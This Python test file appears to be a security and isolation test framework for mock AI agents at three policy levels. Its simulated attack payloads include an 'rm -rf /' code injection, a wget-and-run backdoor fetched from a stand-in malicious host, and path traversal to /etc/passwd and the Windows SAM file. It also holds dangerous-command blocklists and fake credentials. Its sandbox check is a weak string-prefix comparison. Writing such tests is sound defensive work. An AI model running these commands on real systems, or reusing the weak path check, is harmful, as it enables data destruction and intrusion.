#!/usr/bin/env python3
"""
Security and Isolation Testing Framework

Comprehensive security testing for multi-CLI agent coordination system.
Tests isolation boundaries, security policies, access controls, and 
vulnerability protection across heterogeneous agent environments.

This framework validates:
- Agent isolation and sandboxing
- Cross-agent security boundaries
- Authentication and authorization
- Input validation and sanitization
- Privilege escalation prevention
- Data leakage protection
- Audit logging and monitoring
"""

import asyncio
import json
import time
import tempfile
import shutil
import hashlib
import secrets
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple, Set
from dataclasses import dataclass, field
from enum import Enum
import pytest
import subprocess
import os
import stat
import uuid
import base64
from contextlib import asynccontextmanager

class SecurityThreatLevel(Enum):
    """Security threat levels."""
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class AttackVector(Enum):
    """Different attack vectors to test."""
    CODE_INJECTION = "code_injection"
    PATH_TRAVERSAL = "path_traversal"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    DATA_EXFILTRATION = "data_exfiltration"
    COMMAND_INJECTION = "command_injection"
    AUTHENTICATION_BYPASS = "authentication_bypass"
    AUTHORIZATION_BYPASS = "authorization_bypass"
    RESOURCE_EXHAUSTION = "resource_exhaustion"
    INFORMATION_DISCLOSURE = "information_disclosure"

class SecurityPolicy(Enum):
    """Security policy types."""
    STRICT = "strict"
    MODERATE = "moderate"
    PERMISSIVE = "permissive"

@dataclass
class SecurityTest:
    """Definition of a security test."""
    test_id: str
    name: str
    description: str
    attack_vector: AttackVector
    threat_level: SecurityThreatLevel
    target_agent: str
    payload: Dict[str, Any]
    expected_result: str  # "blocked", "detected", "logged"
    success_criteria: List[str]

@dataclass
class SecurityResult:
    """Results from a security test."""
    test_id: str
    test_name: str
    start_time: float
    end_time: float
    status: str  # "passed", "failed", "error"
    attack_blocked: bool
    attack_detected: bool
    attack_logged: bool
    vulnerability_found: bool
    details: Dict[str, Any] = field(default_factory=dict)
    evidence: List[str] = field(default_factory=list)

class SecurityAgent:
    """Security-aware mock agent for testing."""
    
    def __init__(self, agent_id: str, security_level: SecurityPolicy):
        self.agent_id = agent_id
        self.security_level = security_level
        self.sandbox_path = None
        self.allowed_operations = set()
        self.blocked_operations = set()
        self.security_logs = []
        self.access_violations = []
        self.session_token = self._generate_session_token()
    
    def _generate_session_token(self) -> str:
        """Generate secure session token."""
        return secrets.token_urlsafe(32)
    
    def setup_sandbox(self, sandbox_path: Path):
        """Setup security sandbox for agent."""
        self.sandbox_path = sandbox_path
        
        # Create sandbox directory structure
        (sandbox_path / "workspace").mkdir(parents=True, exist_ok=True)
        (sandbox_path / "temp").mkdir(parents=True, exist_ok=True)
        (sandbox_path / "logs").mkdir(parents=True, exist_ok=True)
        
        # Set permissions based on security level
        if self.security_level == SecurityPolicy.STRICT:
            self.allowed_operations = {"read", "write_workspace", "execute_safe"}
            self.blocked_operations = {"system_call", "network_access", "file_system_root"}
        elif self.security_level == SecurityPolicy.MODERATE:
            self.allowed_operations = {"read", "write", "execute", "network_limited"}
            self.blocked_operations = {"system_admin", "file_system_root"}
        else:  # PERMISSIVE
            self.allowed_operations = {"read", "write", "execute", "network", "system"}
            self.blocked_operations = set()
    
    async def process_request(self, request: Dict[str, Any]) -> Dict[str, Any]:
        """Process request with security validation."""
        request_id = str(uuid.uuid4())
        start_time = time.time()
        
        # Log request
        self.security_logs.append({
            "timestamp": start_time,
            "request_id": request_id,
            "type": "request_received",
            "request": request,
            "agent_id": self.agent_id
        })
        
        try:
            # Validate authentication
            auth_result = self._validate_authentication(request)
            if not auth_result["valid"]:
                return self._create_security_response("authentication_failed", request_id, auth_result)
            
            # Validate authorization
            authz_result = self._validate_authorization(request)
            if not authz_result["authorized"]:
                return self._create_security_response("authorization_failed", request_id, authz_result)
            
            # Validate input
            input_result = self._validate_input(request)
            if not input_result["safe"]:
                return self._create_security_response("input_validation_failed", request_id, input_result)
            
            # Check sandbox restrictions
            sandbox_result = self._check_sandbox_restrictions(request)
            if not sandbox_result["allowed"]:
                return self._create_security_response("sandbox_violation", request_id, sandbox_result)
            
            # Process the request
            result = await self._execute_request(request)
            
            # Log successful processing
            self.security_logs.append({
                "timestamp": time.time(),
                "request_id": request_id,
                "type": "request_processed",
                "status": "success",
                "agent_id": self.agent_id
            })
            
            return {
                "status": "success",
                "request_id": request_id,
                "result": result,
                "agent_id": self.agent_id,
                "processing_time": time.time() - start_time
            }
        
        except Exception as e:
            # Log error
            self.security_logs.append({
                "timestamp": time.time(),
                "request_id": request_id,
                "type": "request_error",
                "error": str(e),
                "agent_id": self.agent_id
            })
            
            return {
                "status": "error",
                "request_id": request_id,
                "error": str(e),
                "agent_id": self.agent_id
            }
    
    def _validate_authentication(self, request: Dict[str, Any]) -> Dict[str, Any]:
        """Validate request authentication."""
        auth_token = request.get("auth_token")
        
        if not auth_token:
            return {"valid": False, "reason": "missing_auth_token"}
        
        # Simple token validation (in real implementation, this would be more robust)
        if auth_token != self.session_token and auth_token != "test_token":
            return {"valid": False, "reason": "invalid_auth_token"}
        
        return {"valid": True}
    
    def _validate_authorization(self, request: Dict[str, Any]) -> Dict[str, Any]:
        """Validate request authorization."""
        operation = request.get("operation", "")
        
        # Check if operation is allowed
        if operation in self.blocked_operations:
            self.access_violations.append({
                "timestamp": time.time(),
                "operation": operation,
                "reason": "blocked_operation",
                "request": request
            })
            return {"authorized": False, "reason": "operation_blocked"}
        
        if operation not in self.allowed_operations and self.security_level == SecurityPolicy.STRICT:
            return {"authorized": False, "reason": "operation_not_allowed"}
        
        return {"authorized": True}
    
    def _validate_input(self, request: Dict[str, Any]) -> Dict[str, Any]:
        """Validate and sanitize input."""
        dangerous_patterns = [
            # Code injection patterns
            "eval(", "exec(", "__import__", "subprocess", "os.system",
            # Path traversal patterns
            "../", "..\\", "/etc/", "/proc/", "/sys/",
            # Command injection patterns
            ";", "|", "&", "$", "`", "$(", "${",
            # Script injection patterns
            "<script", "javascript:", "data:text/html",
        ]
        
        # Check all string values in request
        def check_value(value):
            if isinstance(value, str):
                for pattern in dangerous_patterns:
                    if pattern.lower() in value.lower():
                        return False, f"dangerous_pattern_detected: {pattern}"
            elif isinstance(value, dict):
                for v in value.values():
                    safe, reason = check_value(v)
                    if not safe:
                        return False, reason
            elif isinstance(value, list):
                for v in value:
                    safe, reason = check_value(v)
                    if not safe:
                        return False, reason
            return True, None
        
        safe, reason = check_value(request)
        
        if not safe:
            self.security_logs.append({
                "timestamp": time.time(),
                "type": "input_validation_failure",
                "reason": reason,
                "request": request,
                "agent_id": self.agent_id
            })
            return {"safe": False, "reason": reason}
        
        return {"safe": True}
    
    def _check_sandbox_restrictions(self, request: Dict[str, Any]) -> Dict[str, Any]:
        """Check sandbox restrictions."""
        if not self.sandbox_path:
            return {"allowed": True}  # No sandbox configured
        
        # Check file access restrictions
        file_path = request.get("file_path", "")
        if file_path:
            # Convert to absolute path
            if not os.path.isabs(file_path):
                abs_path = os.path.abspath(os.path.join(str(self.sandbox_path), file_path))
            else:
                abs_path = os.path.abspath(file_path)
            
            # Check if path is within sandbox
            try:
                sandbox_abs = os.path.abspath(str(self.sandbox_path))
                if not abs_path.startswith(sandbox_abs):
                    return {"allowed": False, "reason": "path_outside_sandbox"}
            except Exception:
                return {"allowed": False, "reason": "path_validation_error"}
        
        return {"allowed": True}
    
    async def _execute_request(self, request: Dict[str, Any]) -> Dict[str, Any]:
        """Execute the validated request."""
        operation = request.get("operation", "")
        
        if operation == "read_file":
            return await self._handle_read_file(request)
        elif operation == "write_file":
            return await self._handle_write_file(request)
        elif operation == "execute_command":
            return await self._handle_execute_command(request)
        elif operation == "list_files":
            return await self._handle_list_files(request)
        elif operation == "network_request":
            return await self._handle_network_request(request)
        else:
            return {"result": f"Processed {operation} operation"}
    
    async def _handle_read_file(self, request: Dict[str, Any]) -> Dict[str, Any]:
        """Handle file read operation."""
        file_path = request.get("file_path", "")
        
        if self.sandbox_path:
            full_path = self.sandbox_path / file_path
        else:
            full_path = Path(file_path)
        
        try:
            if full_path.exists() and full_path.is_file():
                content = full_path.read_text()
                return {"operation": "read_file", "content": content, "file_path": str(full_path)}
            else:
                return {"operation": "read_file", "error": "file_not_found"}
        except Exception as e:
            return {"operation": "read_file", "error": str(e)}
    
    async def _handle_write_file(self, request: Dict[str, Any]) -> Dict[str, Any]:
        """Handle file write operation."""
        file_path = request.get("file_path", "")
        content = request.get("content", "")
        
        if self.sandbox_path:
            full_path = self.sandbox_path / "workspace" / file_path
        else:
            full_path = Path(file_path)
        
        try:
            full_path.parent.mkdir(parents=True, exist_ok=True)
            full_path.write_text(content)
            return {"operation": "write_file", "file_path": str(full_path), "bytes_written": len(content)}
        except Exception as e:
            return {"operation": "write_file", "error": str(e)}
    
    async def _handle_execute_command(self, request: Dict[str, Any]) -> Dict[str, Any]:
        """Handle command execution (simulated)."""
        command = request.get("command", "")
        
        # Security check for dangerous commands
        dangerous_commands = ["rm", "del", "format", "sudo", "su", "chmod 777", "wget", "curl"]
        
        for dangerous in dangerous_commands:
            if dangerous in command.lower():
                self.security_logs.append({
                    "timestamp": time.time(),
                    "type": "dangerous_command_blocked",
                    "command": command,
                    "agent_id": self.agent_id
                })
                return {"operation": "execute_command", "error": "dangerous_command_blocked"}
        
        # Simulate command execution
        return {
            "operation": "execute_command",
            "command": command,
            "output": f"Simulated output for: {command}",
            "exit_code": 0
        }
    
    async def _handle_list_files(self, request: Dict[str, Any]) -> Dict[str, Any]:
        """Handle file listing operation."""
        directory = request.get("directory", ".")
        
        if self.sandbox_path:
            full_path = self.sandbox_path / directory
        else:
            full_path = Path(directory)
        
        try:
            if full_path.exists() and full_path.is_dir():
                files = [f.name for f in full_path.iterdir()]
                return {"operation": "list_files", "files": files, "directory": str(full_path)}
            else:
                return {"operation": "list_files", "error": "directory_not_found"}
        except Exception as e:
            return {"operation": "list_files", "error": str(e)}
    
    async def _handle_network_request(self, request: Dict[str, Any]) -> Dict[str, Any]:
        """Handle network request (simulated)."""
        url = request.get("url", "")
        
        # Check for malicious URLs
        malicious_indicators = ["localhost", "127.0.0.1", "file://", "ftp://"]
        
        for indicator in malicious_indicators:
            if indicator in url.lower():
                self.security_logs.append({
                    "timestamp": time.time(),
                    "type": "malicious_url_blocked",
                    "url": url,
                    "agent_id": self.agent_id
                })
                return {"operation": "network_request", "error": "malicious_url_blocked"}
        
        # Simulate network request
        return {
            "operation": "network_request",
            "url": url,
            "response": "Simulated response data",
            "status_code": 200
        }
    
    def _create_security_response(self, failure_type: str, request_id: str, details: Dict[str, Any]) -> Dict[str, Any]:
        """Create standardized security failure response."""
        self.security_logs.append({
            "timestamp": time.time(),
            "request_id": request_id,
            "type": failure_type,
            "details": details,
            "agent_id": self.agent_id
        })
        
        return {
            "status": "security_failure",
            "failure_type": failure_type,
            "request_id": request_id,
            "details": details,
            "agent_id": self.agent_id
        }
    
    def get_security_summary(self) -> Dict[str, Any]:
        """Get security summary for the agent."""
        return {
            "agent_id": self.agent_id,
            "security_level": self.security_level.value,
            "total_logs": len(self.security_logs),
            "access_violations": len(self.access_violations),
            "sandbox_path": str(self.sandbox_path) if self.sandbox_path else None,
            "allowed_operations": list(self.allowed_operations),
            "blocked_operations": list(self.blocked_operations)
        }

class SecurityTestOrchestrator:
    """Orchestrates security testing scenarios."""
    
    def __init__(self):
        self.agents = {}
        self.test_workspace = None
        self.audit_logs = []
        self.security_incidents = []
    
    def setup_test_environment(self) -> Path:
        """Setup secure test environment."""
        self.test_workspace = Path(tempfile.mkdtemp(prefix="security_test_"))
        
        # Create test data structure
        test_data = {
            "public/readme.txt": "This is public information",
            "confidential/secrets.txt": "CONFIDENTIAL: secret_key=abc123",
            "system/config.json": '{"admin_password": "admin123", "db_connection": "secret"}',
            "workspace/test.py": "print('Hello World')",
            "temp/cache.tmp": "temporary data"
        }
        
        for file_path, content in test_data.items():
            full_path = self.test_workspace / file_path
            full_path.parent.mkdir(parents=True, exist_ok=True)
            full_path.write_text(content)
            
            # Set appropriate permissions
            if "confidential" in file_path or "system" in file_path:
                full_path.chmod(stat.S_IRUSR)  # Read-only for owner
        
        return self.test_workspace
    
    def create_security_agents(self) -> Dict[str, SecurityAgent]:
        """Create agents with different security levels."""
        agents = {
            "strict_agent": SecurityAgent("strict_agent", SecurityPolicy.STRICT),
            "moderate_agent": SecurityAgent("moderate_agent", SecurityPolicy.MODERATE),
            "permissive_agent": SecurityAgent("permissive_agent", SecurityPolicy.PERMISSIVE)
        }
        
        # Setup sandboxes for each agent
        for agent_id, agent in agents.items():
            sandbox_path = self.test_workspace / f"sandbox_{agent_id}"
            agent.setup_sandbox(sandbox_path)
            self.agents[agent_id] = agent
        
        return agents
    
    def create_security_tests() -> List[SecurityTest]:
        """Create comprehensive security test suite."""
        tests = [
            # Code injection tests
            SecurityTest(
                test_id="code_injection_01",
                name="Python Code Injection",
                description="Attempt to inject malicious Python code",
                attack_vector=AttackVector.CODE_INJECTION,
                threat_level=SecurityThreatLevel.HIGH,
                target_agent="strict_agent",
                payload={
                    "operation": "execute_command",
                    "command": "python -c \"__import__('os').system('rm -rf /')\"",
                    "auth_token": "test_token"
                },
                expected_result="blocked",
                success_criteria=["attack_blocked", "attack_logged"]
            ),
            
            SecurityTest(
                test_id="code_injection_02",
                name="Eval Injection",
                description="Attempt to use eval() for code injection",
                attack_vector=AttackVector.CODE_INJECTION,
                threat_level=SecurityThreatLevel.HIGH,
                target_agent="moderate_agent",
                payload={
                    "operation": "write_file",
                    "file_path": "malicious.py",
                    "content": "eval('__import__(\"os\").system(\"whoami\")')",
                    "auth_token": "test_token"
                },
                expected_result="blocked",
                success_criteria=["attack_blocked", "attack_logged"]
            ),
            
            # Path traversal tests
            SecurityTest(
                test_id="path_traversal_01",
                name="Directory Traversal Attack",
                description="Attempt to access files outside sandbox",
                attack_vector=AttackVector.PATH_TRAVERSAL,
                threat_level=SecurityThreatLevel.HIGH,
                target_agent="strict_agent",
                payload={
                    "operation": "read_file",
                    "file_path": "../../../etc/passwd",
                    "auth_token": "test_token"
                },
                expected_result="blocked",
                success_criteria=["attack_blocked", "attack_logged"]
            ),
            
            SecurityTest(
                test_id="path_traversal_02",
                name="Windows Path Traversal",
                description="Attempt Windows-style path traversal",
                attack_vector=AttackVector.PATH_TRAVERSAL,
                threat_level=SecurityThreatLevel.HIGH,
                target_agent="moderate_agent",
                payload={
                    "operation": "read_file",
                    "file_path": "..\\..\\..\\windows\\system32\\config\\sam",
                    "auth_token": "test_token"
                },
                expected_result="blocked",
                success_criteria=["attack_blocked", "attack_logged"]
            ),
            
            # Command injection tests
            SecurityTest(
                test_id="command_injection_01",
                name="Shell Command Injection",
                description="Attempt to inject shell commands",
                attack_vector=AttackVector.COMMAND_INJECTION,
                threat_level=SecurityThreatLevel.CRITICAL,
                target_agent="permissive_agent",
                payload={
                    "operation": "execute_command",
                    "command": "ls; wget http://malicious.com/backdoor.sh; bash backdoor.sh",
                    "auth_token": "test_token"
                },
                expected_result="blocked",
                success_criteria=["attack_blocked", "attack_logged"]
            ),
            
            # Data exfiltration tests
            SecurityTest(
                test_id="data_exfiltration_01",
                name="Sensitive File Access",
                description="Attempt to access confidential files",
                attack_vector=AttackVector.DATA_EXFILTRATION,
                threat_level=SecurityThreatLevel.HIGH,
                target_agent="strict_agent",
                payload={
                    "operation": "read_file",
                    "file_path": "../confidential/secrets.txt",
                    "auth_token": "test_token"
                },
                expected_result="blocked",
                success_criteria=["attack_blocked", "attack_logged"]
            ),
            
            # Authentication bypass tests
            SecurityTest(
                test_id="auth_bypass_01",
                name="Missing Authentication Token",
                description="Attempt to access without authentication",
                attack_vector=AttackVector.AUTHENTICATION_BYPASS,
                threat_level=SecurityThreatLevel.MEDIUM,
                target_agent="strict_agent",
                payload={
                    "operation": "read_file",
                    "file_path": "test.txt"
                },
                expected_result="blocked",
                success_criteria=["attack_blocked", "attack_logged"]
            ),
            
            SecurityTest(
                test_id="auth_bypass_02",
                name="Invalid Authentication Token",
                description="Attempt to use invalid authentication token",
                attack_vector=AttackVector.AUTHENTICATION_BYPASS,
                threat_level=SecurityThreatLevel.MEDIUM,
                target_agent="moderate_agent",
                payload={
                    "operation": "write_file",
                    "file_path": "test.txt",
                    "content": "test",
                    "auth_token": "invalid_token_12345"
                },
                expected_result="blocked",
                success_criteria=["attack_blocked", "attack_logged"]
            ),
            
            # Information disclosure tests
            SecurityTest(
                test_id="info_disclosure_01",
                name="System Information Disclosure",
                description="Attempt to gather system information",
                attack_vector=AttackVector.INFORMATION_DISCLOSURE,
                threat_level=SecurityThreatLevel.MEDIUM,
                target_agent="permissive_agent",
                payload={
                    "operation": "execute_command",
                    "command": "cat /proc/version; uname -a; id",
                    "auth_token": "test_token"
                },
                expected_result="detected",
                success_criteria=["attack_detected", "attack_logged"]
            ),
            
            # Resource exhaustion tests
            SecurityTest(
                test_id="resource_exhaustion_01",
                name="Large File Creation",
                description="Attempt to create very large files",
                attack_vector=AttackVector.RESOURCE_EXHAUSTION,
                threat_level=SecurityThreatLevel.MEDIUM,
                target_agent="strict_agent",
                payload={
                    "operation": "write_file",
                    "file_path": "large_file.txt",
                    "content": "A" * 1000000,  # 1MB of data
                    "auth_token": "test_token"
                },
                expected_result="detected",
                success_criteria=["attack_detected", "attack_logged"]
            )
        ]
        
        return tests
    
    async def execute_security_test(self, test: SecurityTest) -> SecurityResult:
        """Execute a single security test."""
        start_time = time.time()
        
        result = SecurityResult(
            test_id=test.test_id,
            test_name=test.name,
            start_time=start_time,
            end_time=0.0,
            status="running",
            attack_blocked=False,
            attack_detected=False,
            attack_logged=False,
            vulnerability_found=False
        )
        
        try:
            # Get target agent
            target_agent = self.agents.get(test.target_agent)
            if not target_agent:
                result.status = "error"
                result.details["error"] = f"Target agent {test.target_agent} not found"
                return result
            
            # Record security logs before test
            logs_before = len(target_agent.security_logs)
            violations_before = len(target_agent.access_violations)
            
            # Execute the attack
            response = await target_agent.process_request(test.payload)
            
            # Analyze response
            if response.get("status") == "security_failure":
                result.attack_blocked = True
                result.attack_detected = True
            elif response.get("status") == "error":
                result.attack_detected = True
            elif response.get("status") == "success":
                # Attack succeeded - potential vulnerability
                result.vulnerability_found = True
            
            # Check if attack was logged
            logs_after = len(target_agent.security_logs)
            violations_after = len(target_agent.access_violations)
            
            if logs_after > logs_before or violations_after > violations_before:
                result.attack_logged = True
            
            # Store response details
            result.details["response"] = response
            result.details["logs_generated"] = logs_after - logs_before
            result.details["violations_generated"] = violations_after - violations_before
            
            # Evaluate success criteria
            success_count = 0
            total_criteria = len(test.success_criteria)
            
            for criterion in test.success_criteria:
                if criterion == "attack_blocked" and result.attack_blocked:
                    success_count += 1
                elif criterion == "attack_detected" and result.attack_detected:
                    success_count += 1
                elif criterion == "attack_logged" and result.attack_logged:
                    success_count += 1
            
            # Determine test result
            if success_count == total_criteria:
                result.status = "passed"
            elif result.vulnerability_found:
                result.status = "failed"
                self.security_incidents.append({
                    "test_id": test.test_id,
                    "threat_level": test.threat_level.value,
                    "attack_vector": test.attack_vector.value,
                    "description": test.description,
                    "timestamp": start_time
                })
            else:
                result.status = "failed"
        
        except Exception as e:
            result.status = "error"
            result.details["error"] = str(e)
        
        finally:
            result.end_time = time.time()
        
        return result
    
    async def run_comprehensive_security_tests(self) -> Dict[str, Any]:
        """Run comprehensive security test suite."""
        suite_results = {
            "test_suite": "Security and Isolation",
            "start_time": time.time(),
            "tests_executed": 0,
            "tests_passed": 0,
            "tests_failed": 0,
            "vulnerabilities_found": 0,
            "security_incidents": [],
            "detailed_results": []
        }
        
        # Setup test environment
        self.setup_test_environment()
        self.create_security_agents()
        
        # Get security tests
        security_tests = SecurityTestOrchestrator.create_security_tests()
        
        for test in security_tests:
            print(f"üîí Executing security test: {test.name}")
            
            try:
                result = await self.execute_security_test(test)
                suite_results["detailed_results"].append(result)
                suite_results["tests_executed"] += 1
                
                if result.status == "passed":
                    suite_results["tests_passed"] += 1
                    print(f"‚úÖ {test.name} - PASSED")
                else:
                    suite_results["tests_failed"] += 1
                    if result.vulnerability_found:
                        suite_results["vulnerabilities_found"] += 1
                    print(f"‚ùå {test.name} - FAILED")
            
            except Exception as e:
                suite_results["tests_failed"] += 1
                suite_results["detailed_results"].append({
                    "test_id": test.test_id,
                    "test_name": test.name,
                    "status": "error",
                    "error": str(e)
                })
                print(f"‚ùå {test.name} - ERROR: {str(e)}")
        
        suite_results["end_time"] = time.time()
        suite_results["total_duration"] = suite_results["end_time"] - suite_results["start_time"]
        suite_results["security_incidents"] = self.security_incidents
        
        # Generate security summary
        suite_results["security_summary"] = self._generate_security_summary()
        
        return suite_results
    
    def _generate_security_summary(self) -> Dict[str, Any]:
        """Generate comprehensive security summary."""
        summary = {
            "agents_tested": len(self.agents),
            "total_security_logs": 0,
            "total_access_violations": 0,
            "agent_summaries": {}
        }
        
        for agent_id, agent in self.agents.items():
            agent_summary = agent.get_security_summary()
            summary["agent_summaries"][agent_id] = agent_summary
            summary["total_security_logs"] += agent_summary["total_logs"]
            summary["total_access_violations"] += agent_summary["access_violations"]
        
        return summary
    
    def cleanup(self):
        """Cleanup test environment."""
        if self.test_workspace and self.test_workspace.exists():
            shutil.rmtree(self.test_workspace, ignore_errors=True)

class SecurityTestSuite:
    """Main test suite for security and isolation testing."""
    
    def __init__(self):
        self.orchestrator = SecurityTestOrchestrator()
    
    async def run_security_tests(self) -> Dict[str, Any]:
        """Run all security tests."""
        try:
            results = await self.orchestrator.run_comprehensive_security_tests()
            return results
        finally:
            self.orchestrator.cleanup()

# Pytest integration
@pytest.fixture
async def security_test_suite():
    """Pytest fixture for security testing."""
    suite = SecurityTestSuite()
    yield suite

@pytest.mark.asyncio
async def test_code_injection_protection(security_test_suite):
    """Test code injection protection."""
    suite = security_test_suite
    
    # Setup
    suite.orchestrator.setup_test_environment()
    agents = suite.orchestrator.create_security_agents()
    
    # Test code injection
    test = SecurityTest(
        test_id="pytest_code_injection",
        name="Pytest Code Injection Test",
        description="Test code injection protection",
        attack_vector=AttackVector.CODE_INJECTION,
        threat_level=SecurityThreatLevel.HIGH,
        target_agent="strict_agent",
        payload={
            "operation": "execute_command",
            "command": "python -c \"print('injected code')\"",
            "auth_token": "test_token"
        },
        expected_result="blocked",
        success_criteria=["attack_blocked", "attack_logged"]
    )
    
    result = await suite.orchestrator.execute_security_test(test)
    
    assert result.status == "passed"
    assert result.attack_blocked
    assert result.attack_logged

@pytest.mark.asyncio
async def test_path_traversal_protection(security_test_suite):
    """Test path traversal protection."""
    suite = security_test_suite
    
    # Setup
    suite.orchestrator.setup_test_environment()
    agents = suite.orchestrator.create_security_agents()
    
    # Test path traversal
    test = SecurityTest(
        test_id="pytest_path_traversal",
        name="Pytest Path Traversal Test",
        description="Test path traversal protection",
        attack_vector=AttackVector.PATH_TRAVERSAL,
        threat_level=SecurityThreatLevel.HIGH,
        target_agent="strict_agent",
        payload={
            "operation": "read_file",
            "file_path": "../../../sensitive_file.txt",
            "auth_token": "test_token"
        },
        expected_result="blocked",
        success_criteria=["attack_blocked", "attack_logged"]
    )
    
    result = await suite.orchestrator.execute_security_test(test)
    
    assert result.status == "passed"
    assert result.attack_blocked

@pytest.mark.asyncio
async def test_authentication_validation(security_test_suite):
    """Test authentication validation."""
    suite = security_test_suite
    
    # Setup
    suite.orchestrator.setup_test_environment()
    agents = suite.orchestrator.create_security_agents()
    
    # Test missing authentication
    test = SecurityTest(
        test_id="pytest_auth_test",
        name="Pytest Authentication Test",
        description="Test authentication requirement",
        attack_vector=AttackVector.AUTHENTICATION_BYPASS,
        threat_level=SecurityThreatLevel.MEDIUM,
        target_agent="strict_agent",
        payload={
            "operation": "read_file",
            "file_path": "test.txt"
            # Missing auth_token
        },
        expected_result="blocked",
        success_criteria=["attack_blocked", "attack_logged"]
    )
    
    result = await suite.orchestrator.execute_security_test(test)
    
    assert result.status == "passed"
    assert result.attack_blocked

if __name__ == "__main__":
    async def main():
        """Run security and isolation tests standalone."""
        print("üîí Security and Isolation Testing Suite")
        print("=" * 60)
        
        test_suite = SecurityTestSuite()
        
        try:
            results = await test_suite.run_security_tests()
            
            print("\n" + "=" * 60)
            print("üìä SECURITY TEST RESULTS")
            print("=" * 60)
            print(f"Tests Executed: {results['tests_executed']}")
            print(f"Tests Passed: {results['tests_passed']}")
            print(f"Tests Failed: {results['tests_failed']}")
            print(f"Vulnerabilities Found: {results['vulnerabilities_found']}")
            print(f"Security Incidents: {len(results['security_incidents'])}")
            print(f"Total Duration: {results['total_duration']:.2f}s")
            
            if results['vulnerabilities_found'] > 0:
                print("\n‚ö†Ô∏è  SECURITY VULNERABILITIES DETECTED:")
                for incident in results['security_incidents']:
                    print(f"  - {incident['description']} (Level: {incident['threat_level']})")
            
            # Save detailed results
            with open('security_isolation_test_results.json', 'w') as f:
                json.dump(results, f, indent=2, default=str)
            
            print(f"\nüìÑ Detailed results saved to: security_isolation_test_results.json")
            
        except Exception as e:
            print(f"‚ùå Test suite error: {str(e)}")
    
    asyncio.run(main())